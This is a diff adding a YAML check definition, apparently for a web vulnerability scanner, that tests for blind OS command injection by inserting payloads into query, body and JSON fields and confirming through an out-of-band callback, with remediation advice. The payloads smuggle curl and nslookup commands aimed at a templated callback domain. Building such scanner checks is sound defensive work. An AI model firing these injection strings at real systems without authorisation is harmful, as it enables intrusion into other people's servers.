@@ -1,0 +1,22 @@
+id: cmdi-oob
+name: OS Command Injection (blind, OAST-confirmed)
+family: cmdi
+severity: critical
+cwe: CWE-78
+owasp: WSTG-INPV-12
+inject_into: [query, body, json]
+payloads:
+  - ";curl http://{{oast_domain}}/;"
+  - "|curl http://{{oast_domain}}/"
+  - "$(curl http://{{oast_domain}}/)"
+  - "`curl http://{{oast_domain}}/`"
+  - "& nslookup {{oast_domain}} &"
+oracle:
+  type: any_of
+  checks:
+    - type: oob
+confirm_reproducible: false
+remediation: >-
+  Never pass user input to a shell. Use parameterized process APIs that take an
+  argument vector (no shell interpretation), validate against an allowlist, and
+  drop shell metacharacters.
